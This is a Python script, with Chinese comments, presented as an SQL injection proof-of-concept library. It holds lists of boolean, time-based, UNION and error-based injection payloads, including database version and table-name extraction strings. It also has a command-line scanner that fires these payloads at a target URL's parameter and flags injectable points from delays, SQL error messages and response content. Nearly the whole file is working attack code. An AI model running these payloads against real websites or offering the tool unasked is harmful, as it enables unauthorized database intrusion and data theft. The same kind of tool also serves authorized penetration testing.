#!/usr/bin/env python3
"""
SQL 注入漏洞 POC 库
支持: 布尔盲注、时间盲注、联合查询、报错注入
"""
import argparse, sys, time, urllib.parse
sys.path.insert(0, '..')
from utils.http import detect_sqli, http_get, http_post

SQLI_PAYLOADS = {
    "boolean": ["' OR '1'='1", "1' AND '1'='1", "admin'--", "' OR 1=1--"],
    "time": ["' WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--", "'; SELECT SLEEP(5)--"],
    "union": ["1' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "1' UNION ALL SELECT NULL,NULL--"],
    "error": ["1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"],
}

def detect_sqli_type(url, param="id"):
    """识别 SQL 注入类型"""
    base = url.split('?')[0]
    results = []
    for sqli_type, payloads in SQLI_PAYLOADS.items():
        for p in payloads[:2]:
            target = f"{base}?{param}={urllib.parse.quote(p)}"
            start = time.time()
            try:
                resp = http_get(target, timeout=15)
                elapsed = time.time() - start
                body = str(resp.get("body", b""))
                status = resp.get("status", 0)

                # 时间盲注
                if "time" in sqli_type and elapsed >= 4:
                    results.append(f"[+] 时间盲注: {p}")
                    continue

                # 报错注入
                sql_errors = ["sql syntax", "mysql_", "ora-", "sqlstate", "syntax error", "warning:"]
                for err in sql_errors:
                    if err.lower() in body.lower():
                        results.append(f"[+] 报错注入: {p} ({err})")
                        break

                # 布尔盲注（响应差异）
                if status == 200 and ("welcome" in body.lower() or "admin" in body.lower()):
                    results.append(f"[?] 布尔盲注候选: {p}")

            except Exception as e:
                pass
    return results

def main():
    parser = argparse.ArgumentParser(description="SQL 注入漏洞扫描")
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-p", "--param", default="id", help="参数名")
    args = parser.parse_args()

    print(f"[*] 目标: {args.target}")
    results = detect_sqli_type(args.target, args.param)
    if results:
        print(f"[+] 发现 {len(results)} 个候选注入点:")
        for r in results:
            print(f"    {r}")
    else:
        print("[-] 未发现明显 SQL 注入")

if __name__ == "__main__":
    main()
